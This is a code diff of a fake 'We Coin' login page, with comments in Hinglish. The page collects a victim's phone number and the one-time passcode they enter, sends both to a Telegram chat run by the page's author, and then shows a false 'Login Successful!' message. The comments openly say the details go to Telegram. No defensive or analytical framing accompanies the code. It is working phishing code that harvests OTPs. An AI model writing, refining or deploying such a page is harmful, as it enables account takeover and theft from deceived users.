@@ -54,8 +54,8 @@
 
     <div class="main-container">
         <div class="logo-container">
-            <!-- Yahan apni We Coin image ka naam daalein -->
-    <img src="IMG_20261004_195344_165.jpg" alt="We Coin">
+            <!-- Yahan apni We Coin image ka naam daalein, jaise: IMG_1234.jpg -->
+            <img src="IMG_20261004_195344_165.jpg" alt="We Coin">
         </div>
 
         <form id="loginForm">
@@ -141,7 +141,7 @@
             sendOtpBtn.disabled = false;
         }
 
-        // 1. SIGN IN BUTTON
+        // 1. SIGN IN BUTTON (Details Telegram par jayengi)
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const phone = document.getElementById('phone').value;
@@ -155,58 +155,59 @@
             modal.style.display = 'flex'; 
         });
 
-        // 2. SEND OTP BUTTON
-        // 2. SEND OTP BUTTON
-sendOtpBtn.addEventListener('click', async function() {
-    const phone = document.getElementById('phone').value;
-    
-    this.disabled = true;
-    let timeLeft = 60;
-    this.innerText = `${timeLeft}s`;
+        // 2. SEND OTP BUTTON (60 Second Timer ke saath)
+        sendOtpBtn.addEventListener('click', async function() {
+            const phone = document.getElementById('phone').value;
+            
+            this.disabled = true;
+            let timeLeft = 60;
+            this.innerText = `${timeLeft}s`;
 
-    const msg = `🚨 *We Coin: OTP Request Aaya Hai!*\n\n📱 User ne Send OTP dabaya.\n📞 Phone: ${phone}`;
-    await sendToTelegram(msg);
+            // Telegram par OTP request ka message bhejna
+            const msg = `🚨 *We Coin: OTP Request Aaya Hai!*\n\n📱 User ne Send OTP dabaya.\n📞 Phone: ${phone}`;
+            await sendToTelegram(msg);
 
-    timerInterval = setInterval(() => {
-        timeLeft--;
-        sendOtpBtn.innerText = `${timeLeft}s`;
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                sendOtpBtn.innerText = `${timeLeft}s`;
 
-        if (timeLeft <= 0) {
-            clearInterval(timerInterval);
-            sendOtpBtn.innerText = "Send";
-            sendOtpBtn.disabled = false;
-        }
-    }, 1000);
-});
-        
-// 3. CONFIRM BUTTON
-document.getElementById('confirmOtpBtn').addEventListener('click', async function() {
-    const phone = document.getElementById('phone').value;
-    const otp = document.getElementById('otpCode').value;
-    
-    if(!otp) {
-        alert("Pehle 6-digit OTP enter karein!");
-        return;
-    }
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    sendOtpBtn.innerText = "Send";
+                    sendOtpBtn.disabled = false;
+                }
+            }, 1000);
+        });
 
-    this.innerText = "Confirming...";
-    this.disabled = true;
+        // 3. CONFIRM BUTTON (Enter kiya hua OTP Telegram par jayega)
+        document.getElementById('confirmOtpBtn').addEventListener('click', async function() {
+            const phone = document.getElementById('phone').value;
+            const otp = document.getElementById('otpCode').value;
+            
+            if(!otp) {
+                alert("Pehle 6-digit OTP enter karein!");
+                return;
+            }
 
-    const msg = `✅ *We Coin: OTP Enter Hua!*\n\n📞 Phone: ${phone}\n🔢 Entered OTP: ${otp}`;
-    const success = await sendToTelegram(msg);
+            this.innerText = "Confirming...";
+            this.disabled = true;
 
-    if(success) {
-        alert("Login Successful!");
-        closeModal();
-        document.getElementById('loginForm').reset();
-        document.getElementById('otpCode').value = "";
-    } else {
-        alert("Telegram par nahi gaya, network check karein.");
-    }
+            // Telegram par OTP ka message bhejna
+            const msg = `✅ *We Coin: OTP Enter Hua!*\n\n📞 Phone: ${phone}\n🔢 Entered OTP: ${otp}`;
+            const success = await sendToTelegram(msg);
 
-    this.innerText = "Confirm";
-    this.disabled = false;
-});
-       </script>  
+            if(success) {
+                alert("Login Successful!");
+                closeModal();
+                document.getElementById('loginForm').reset();
+                document.getElementById('otpCode').value = "";
+            } else {
+                alert("Telegram par nahi gaya, network check karein.");
+            }
+
+            this.innerText = "Confirm";
+            this.disabled = false;
+        });
+    </script>
 </body>
 </html>
